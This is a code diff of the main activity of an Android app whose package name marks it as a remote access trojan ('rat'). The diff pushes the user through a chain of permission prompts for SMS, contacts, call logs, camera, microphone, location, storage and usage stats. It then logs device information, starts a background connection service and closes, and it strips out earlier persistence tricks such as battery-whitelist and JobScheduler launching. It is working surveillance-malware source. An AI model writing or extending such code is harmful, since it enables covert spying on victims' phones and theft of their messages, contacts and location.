@@ -1,14 +1,14 @@
 package com.fly0rakoon.rat;
 
+
+
 import android.Manifest;
 import android.app.AppOpsManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.PowerManager;
 import android.provider.Settings;
 import android.util.Log;
 import android.widget.Toast;
@@ -17,71 +17,84 @@ import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import com.fly0rakoon.rat.utils.DeviceInfoUtils;
 
-import com.fly0rakoon.rat.services.ForegroundService;
-import com.fly0rakoon.rat.services.JobSchedulerService;
+import org.json.JSONObject;
 
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
-    
-    private static final int PERMISSION_REQUEST_CODE = 100;
     private static final int REQUEST_ALL_PERMISSIONS = 123;
     private static final int REQUEST_CRITICAL_PERMISSIONS = 124;
+    private static final int PERMISSION_REQUEST_CODE = 100;
     private static final String TAG = "MainActivity";
-    
-    // All permissions we need
-    private final String[] REQUIRED_PERMISSIONS = new String[] {
-            Manifest.permission.INTERNET,
-            Manifest.permission.ACCESS_NETWORK_STATE,
+    private static final int PERMISSION_REQUEST_SEND_SMS = 125;
+
+    // Core permissions needed for device info collection
+    private static final String[] CORE_PERMISSIONS = {
+            Manifest.permission.READ_PHONE_STATE,
             Manifest.permission.ACCESS_WIFI_STATE,
+            Manifest.permission.PACKAGE_USAGE_STATS
+    };
+
+    // All permissions we'd like to have (including video permissions)
+    private final String[] REQUIRED_RUNTIME_PERMISSIONS = new String[] {
             Manifest.permission.READ_PHONE_STATE,
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.READ_CALL_LOG,
             Manifest.permission.READ_SMS,
             Manifest.permission.SEND_SMS,
             Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.CAMERA, // For video recording
+            Manifest.permission.RECORD_AUDIO, // For video recording audio
             Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.FOREGROUND_SERVICE,
-            Manifest.permission.POST_NOTIFICATIONS,
-            Manifest.permission.RECEIVE_BOOT_COMPLETED,
-            Manifest.permission.WAKE_LOCK,
-            Manifest.permission.SYSTEM_ALERT_WINDOW,
-            Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-            Manifest.permission.SCHEDULE_EXACT_ALARM,
-            Manifest.permission.USE_EXACT_ALARM
+            Manifest.permission.READ_EXTERNAL_STORAGE, // For saving video files
+            Manifest.permission.WRITE_EXTERNAL_STORAGE, // For saving video files
+            Manifest.permission.READ_MEDIA_IMAGES,
+            Manifest.permission.READ_MEDIA_AUDIO,
+            Manifest.permission.READ_MEDIA_VIDEO
     };
-    
-    // Critical permissions (must have)
+
+    // Absolutely essential permissions (including video permissions)
     private final String[] CRITICAL_PERMISSIONS = new String[] {
-            Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.FOREGROUND_SERVICE,
-            Manifest.permission.POST_NOTIFICATIONS,
-            Manifest.permission.RECEIVE_BOOT_COMPLETED
+            Manifest.permission.CAMERA, // Essential for video
+            Manifest.permission.RECORD_AUDIO, // Essential for video
+            Manifest.permission.WRITE_EXTERNAL_STORAGE, // Essential for saving videos
+            Manifest.permission.READ_EXTERNAL_STORAGE, // Essential for accessing videos
+            Manifest.permission.ACCESS_FINE_LOCATION
     };
-    
+
+    private boolean hasSmsPermissions() {
+        return ContextCompat.checkSelfPermission(this,
+                Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED &&
+                ContextCompat.checkSelfPermission(this,
+                        Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
+                &&
+                ContextCompat.checkSelfPermission(this,
+                        Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
+    }
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        // Check if we have all permissions
-        if (!hasAllPermissions()) {
-            requestAllPermissions();
+
+        // First check SMS permissions since they're critical for sending
+        if (!hasSmsPermissions()) {
+            requestSmsPermissions();
         }
-        // Check if we have critical permissions
+        // First check core permissions for device info collection
+        else if (!allCorePermissionsGranted()) {
+            requestCorePermissions();
+        }
+        // Then check critical permissions (now includes video permissions)
         else if (!hasCriticalPermissions()) {
             requestCriticalPermissions();
+        }
+        // Then check if we have all desired permissions
+        else if (!hasAllRuntimePermissions()) {
+            requestAllPermissions();
         }
         // Check for usage stats permission
         else if (!hasUsageStatsPermission()) {
@@ -89,19 +102,30 @@ public class MainActivity extends AppCompatActivity {
         }
         // If we have everything, start the service
         else {
-            startPersistenceService();
+            startServiceAndFinish();
         }
     }
-    
-    private boolean hasAllPermissions() {
-        for (String permission : REQUIRED_PERMISSIONS) {
+
+    private void requestSmsPermissions() {
+        ActivityCompat.requestPermissions(
+                this,
+                new String[] {
+                        Manifest.permission.SEND_SMS,
+                        Manifest.permission.READ_SMS,
+                        Manifest.permission.RECEIVE_SMS
+                },
+                PERMISSION_REQUEST_SEND_SMS);
+    }
+
+    private boolean allCorePermissionsGranted() {
+        for (String permission : CORE_PERMISSIONS) {
             if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                 return false;
             }
         }
         return true;
     }
-    
+
     private boolean hasCriticalPermissions() {
         for (String permission : CRITICAL_PERMISSIONS) {
             if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
@@ -110,33 +134,44 @@ public class MainActivity extends AppCompatActivity {
         }
         return true;
     }
-    
-    private boolean hasUsageStatsPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
-            int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
-                    android.os.Process.myUid(), getPackageName());
-            return mode == AppOpsManager.MODE_ALLOWED;
+
+    private boolean hasAllRuntimePermissions() {
+        for (String permission : REQUIRED_RUNTIME_PERMISSIONS) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
         }
         return true;
     }
-    
-    private void requestAllPermissions() {
+
+    private boolean hasUsageStatsPermission() {
+        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
+        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
+                android.os.Process.myUid(), getPackageName());
+        return mode == AppOpsManager.MODE_ALLOWED;
+    }
+
+    private void requestCorePermissions() {
         List<String> permissionsToRequest = new ArrayList<>();
-        for (String permission : REQUIRED_PERMISSIONS) {
+        for (String permission : CORE_PERMISSIONS) {
             if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-                permissionsToRequest.add(permission);
+                // Skip PACKAGE_USAGE_STATS as it requires special handling
+                if (!permission.equals(Manifest.permission.PACKAGE_USAGE_STATS)) {
+                    permissionsToRequest.add(permission);
+                }
             }
         }
-        
+
         if (!permissionsToRequest.isEmpty()) {
             ActivityCompat.requestPermissions(
                     this,
                     permissionsToRequest.toArray(new String[0]),
-                    REQUEST_ALL_PERMISSIONS);
+                    PERMISSION_REQUEST_CODE);
+        } else if (!hasUsageStatsPermission()) {
+            requestUsageStatsPermission();
         }
     }
-    
+
     private void requestCriticalPermissions() {
         List<String> permissionsToRequest = new ArrayList<>();
         for (String permission : CRITICAL_PERMISSIONS) {
@@ -144,7 +179,7 @@ public class MainActivity extends AppCompatActivity {
                 permissionsToRequest.add(permission);
             }
         }
-        
+
         if (!permissionsToRequest.isEmpty()) {
             ActivityCompat.requestPermissions(
                     this,
@@ -152,102 +187,168 @@ public class MainActivity extends AppCompatActivity {
                     REQUEST_CRITICAL_PERMISSIONS);
         }
     }
-    
+
+    private void requestAllPermissions() {
+        List<String> permissionsToRequest = new ArrayList<>();
+        for (String permission : REQUIRED_RUNTIME_PERMISSIONS) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(permission);
+            }
+        }
+
+        if (!permissionsToRequest.isEmpty()) {
+            ActivityCompat.requestPermissions(
+                    this,
+                    permissionsToRequest.toArray(new String[0]),
+                    REQUEST_ALL_PERMISSIONS);
+        }
+    }
+
     private void requestUsageStatsPermission() {
-        Toast.makeText(this, "Please grant Usage Access permission for better functionality", Toast.LENGTH_LONG).show();
+        Toast.makeText(this, "Please grant Usage Access permission", Toast.LENGTH_LONG).show();
         startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
     }
-    
+
+    private void startServiceAndFinish() {
+        collectAndLogDeviceInfo();
+        startService(new Intent(this, ConnectionService.class));
+        finish();
+    }
+
     @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+    public void onRequestPermissionsResult(int requestCode,
+            @NonNull String[] permissions,
+            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        
-        if (requestCode == REQUEST_ALL_PERMISSIONS || requestCode == REQUEST_CRITICAL_PERMISSIONS) {
-            if (hasCriticalPermissions()) {
-                if (!hasUsageStatsPermission()) {
-                    requestUsageStatsPermission();
-                } else {
-                    startPersistenceService();
-                }
+
+        if (requestCode == PERMISSION_REQUEST_SEND_SMS) {
+            handleSmsPermissionsResult(grantResults);
+        } else if (requestCode == PERMISSION_REQUEST_CODE) {
+            handleCorePermissionsResult(grantResults);
+        } else if (requestCode == REQUEST_CRITICAL_PERMISSIONS) {
+            handleCriticalPermissionsResult(grantResults);
+        } else if (requestCode == REQUEST_ALL_PERMISSIONS) {
+            handleAllPermissionsResult(grantResults);
+        }
+    }
+
+    private void handleSmsPermissionsResult(int[] grantResults) {
+        boolean allGranted = true;
+        for (int result : grantResults) {
+            if (result != PackageManager.PERMISSION_GRANTED) {
+                allGranted = false;
+                break;
+            }
+        }
+
+        if (allGranted) {
+            // SMS permissions granted, check other permissions
+            if (!allCorePermissionsGranted()) {
+                requestCorePermissions();
+            } else if (!hasCriticalPermissions()) {
+                requestCriticalPermissions();
+            } else if (!hasAllRuntimePermissions()) {
+                requestAllPermissions();
+            } else if (!hasUsageStatsPermission()) {
+                requestUsageStatsPermission();
             } else {
-                Toast.makeText(this, "Some critical permissions denied. App may not function fully.", Toast.LENGTH_LONG).show();
-                // Still try to start
-                startPersistenceService();
+                startServiceAndFinish();
+            }
+        } else {
+            Toast.makeText(this, "SMS permissions are required for full functionality", Toast.LENGTH_LONG).show();
+            finish();
+        }
+    }
+
+    private void handleCorePermissionsResult(int[] grantResults) {
+        boolean allGranted = true;
+        for (int result : grantResults) {
+            if (result != PackageManager.PERMISSION_GRANTED) {
+                allGranted = false;
+                break;
+            }
+        }
+
+        if (allGranted) {
+            if (!hasUsageStatsPermission()) {
+                requestUsageStatsPermission();
+            } else if (!hasCriticalPermissions()) {
+                requestCriticalPermissions();
+            } else if (!hasAllRuntimePermissions()) {
+                requestAllPermissions();
+            } else {
+                startServiceAndFinish();
+            }
+        } else {
+            Toast.makeText(this, "Core permissions denied. Limited functionality.", Toast.LENGTH_LONG).show();
+            finish();
+        }
+    }
+
+    private void handleCriticalPermissionsResult(int[] grantResults) {
+        boolean allGranted = true;
+        for (int result : grantResults) {
+            if (result != PackageManager.PERMISSION_GRANTED) {
+                allGranted = false;
+                break;
+            }
+        }
+
+        if (allGranted) {
+            if (!hasAllRuntimePermissions()) {
+                requestAllPermissions();
+            } else if (!hasUsageStatsPermission()) {
+                requestUsageStatsPermission();
+            } else {
+                startServiceAndFinish();
+            }
+        } else {
+            Toast.makeText(this, "Critical permissions denied. App cannot function.", Toast.LENGTH_LONG).show();
+            finish();
+        }
+    }
+
+    private void handleAllPermissionsResult(int[] grantResults) {
+        boolean allGranted = true;
+        for (int result : grantResults) {
+            if (result != PackageManager.PERMISSION_GRANTED) {
+                allGranted = false;
+                break;
+            }
+        }
+
+        if (allGranted) {
+            if (!hasUsageStatsPermission()) {
+                requestUsageStatsPermission();
+            } else {
+                startServiceAndFinish();
+            }
+        } else {
+            // Even if some non-critical permissions were denied, we can still proceed
+            if (hasUsageStatsPermission()) {
+                startServiceAndFinish();
+            } else {
+                requestUsageStatsPermission();
             }
         }
     }
-    
+
     @Override
     protected void onResume() {
         super.onResume();
         // Check if we're returning from permission settings
-        if (hasCriticalPermissions()) {
-            startPersistenceService();
+        if (hasSmsPermissions() && allCorePermissionsGranted() && hasCriticalPermissions() &&
+                hasAllRuntimePermissions() && hasUsageStatsPermission()) {
+            startServiceAndFinish();
         }
     }
-    
-    private void startPersistenceService() {
-        // Start foreground service
-        Intent serviceIntent = new Intent(this, ForegroundService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
-        
-        // Request battery optimization whitelist
-        requestBatteryOptimizationWhitelist();
-        
-        // Request notification listener access
-        requestNotificationListenerAccess();
-        
-        // Schedule JobScheduler for extra persistence
-        scheduleJobScheduler();
-        
-        finish();
-    }
-    
-    private void requestBatteryOptimizationWhitelist() {
+
+    private void collectAndLogDeviceInfo() {
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-                String pkg = getPackageName();
-                if (pm != null && !pm.isIgnoringBatteryOptimizations(pkg)) {
-                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                            Uri.parse("package:" + pkg));
-                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(intent);
-                }
-            }
+            JSONObject info = DeviceInfoUtils.collectDeviceInfo(this);
+            Log.d(TAG, "Device Info:\n" + info.toString(4));
         } catch (Exception e) {
-            Log.e(TAG, "Battery opt-out failed: " + e.getMessage());
-        }
-    }
-    
-    private void requestNotificationListenerAccess() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-            try {
-                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
-                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to open notification settings: " + e.getMessage());
-            }
-        }
-    }
-    
-    private void scheduleJobScheduler() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            try {
-                Intent intent = new Intent(this, JobSchedulerService.class);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    startForegroundService(intent);
-                } else {
-                    startService(intent);
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to start JobScheduler: " + e.getMessage());
-            }
+            Log.e(TAG, "Failed to collect device info", e);
         }
     }
 }
